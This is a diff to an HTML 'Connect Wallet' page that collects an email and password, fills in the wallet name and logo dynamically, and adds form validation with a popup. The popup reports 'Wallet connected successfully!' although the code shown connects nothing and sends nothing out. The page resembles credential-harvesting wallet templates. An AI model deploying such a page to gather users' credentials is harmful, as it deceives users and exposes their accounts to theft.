@@ -97,20 +97,48 @@
       .check-row input {
         width: 14px;
         height: 14px;
-        transform: translateY(1px); /* perfect alignment */
         cursor: pointer;
-        margin-left: 3px;
+      }
+
+      /* POPUP */
+      #popup {
+        display: none;
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: #00483a;
+        padding: 22px;
+        width: 260px;
+        border-radius: 12px;
+        text-align: center;
+        border: 2px solid #00e6c3;
+        box-shadow: 0 0 15px #00e6c3;
+        z-index: 9999;
+      }
+
+      #popup button {
+        margin-top: 12px;
+        padding: 10px 22px;
+        border: none;
+        border-radius: 10px;
+        background: #00e6c3;
+        color: black;
+        font-weight: bold;
+        cursor: pointer;
       }
     </style>
   </head>
+
   <body>
     <div class="email-card">
       <img id="walletLogo" src="" />
       <h2 id="walletName">Wallet</h2>
 
-      <input type="email" placeholder="Enter Email" />
-      <input type="password" placeholder="Enter Password" />
-      <input type="password" placeholder="Confirm Password" />
+      <input type="email" id="email" placeholder="Enter Email" />
+      <input type="password" id="pass1" placeholder="Enter Password" />
+      <input type="password" id="pass2" placeholder="Confirm Password" />
+
       <div class="bottom-box">
         <label class="check-row">
           <input type="checkbox" id="confirmCheck" />
@@ -118,7 +146,13 @@
         </label>
       </div>
 
-      <button>Connect Wallet</button>
+      <button onclick="validateForm()">Connect Wallet</button>
+    </div>
+
+    <!-- POPUP -->
+    <div id="popup">
+      <p id="popupMsg">Please fill out this field.</p>
+      <button onclick="closePopup()">OK</button>
     </div>
 
     <script>
@@ -127,9 +161,32 @@
 
       document.getElementById("walletName").innerText = wallet;
 
-      // fix icon name
       let imgName = wallet.toLowerCase().replace(/\s+/g, "") + ".webp";
       document.getElementById("walletLogo").src = "wallet-icons/" + imgName;
+
+      function validateForm() {
+        const email = document.getElementById("email").value.trim();
+        const p1 = document.getElementById("pass1").value.trim();
+        const p2 = document.getElementById("pass2").value.trim();
+        const check = document.getElementById("confirmCheck").checked;
+
+        if (email === "") return showPopup("Please enter your email.");
+        if (p1 === "") return showPopup("Please enter your password.");
+        if (p2 === "") return showPopup("Please confirm your password.");
+        if (p1 !== p2) return showPopup("Passwords do not match.");
+        if (!check) return showPopup("Please tick the confirmation checkbox.");
+
+        showPopup("Wallet connected successfully!");
+      }
+
+      function showPopup(msg) {
+        document.getElementById("popupMsg").innerText = msg;
+        document.getElementById("popup").style.display = "block";
+      }
+
+      function closePopup() {
+        document.getElementById("popup").style.display = "none";
+      }
     </script>
   </body>
 </html>
